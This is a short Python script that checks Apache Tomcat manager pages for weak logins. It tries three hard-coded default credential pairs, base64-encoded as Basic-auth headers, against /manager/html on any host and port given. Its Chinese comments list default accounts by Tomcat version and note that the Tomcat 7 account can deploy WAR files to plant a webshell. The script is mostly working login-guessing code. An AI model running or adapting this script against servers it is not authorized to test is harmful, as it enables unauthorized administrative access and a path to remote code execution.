# Author：bamboo
# Time：2022/11/22 12:56
# 大 道 至 简 ！

import re
import requests
import urllib3
urllib3.disable_warnings()

# Tomcat弱口令漏洞
# 后台地址默认为 ip/manager/html
# Tomcat <= 6.0.0 默认用户名为admin，密码为空，无暴力破解限制。
# Tomcat >= 6.0.0 无默认用户，五次失败后，账户即被锁定。

# Tomcat5默认配置了两个角色：tomcat、role1。其中帐号为both、tomcat、role1的默认密码都是tomcat。
# Tomcat6默认没有配置任何用户以及角色，没办法用默认帐号登录。
# Tomcat7默认有tomcat用户 密码为tomcat 拥有直接部署war文件的权限 可以直接上马
# Tomcat8中正常安装的情况下默认没有任何用户，且manager页面只允许本地IP访问
# 修复方案: Tomcat的用户配置文件tomcat-users.xml中进行修改


def break_Pwd(target, port, headers):
    pwd = ['dG9tY2F0OnRvbWNhdA==','cm9sZTE6dG9tY2F0','Ym90aDp0b21jYXQ=']
    for i in pwd:
        # 'Authorization': 'Basic dG9tY2F0OnRvbWNhdA==' 
        headers['Authorization'] = f'Basic {i}'
        url = f'http://{target}:{port}/manager/html'
        try:
            response = requests.get(url=url, headers=headers, verify=False)
            if bool(re.search('Message',response.text)):
                print(f'[+] 存在Tomcat后台泄露漏洞，url为：{url}')
                print(f'[+] 存在Tomcat弱口令漏洞，url为：{url}（{i}）')
        except Exception:
            # print('[+] 运行报错')
            pass



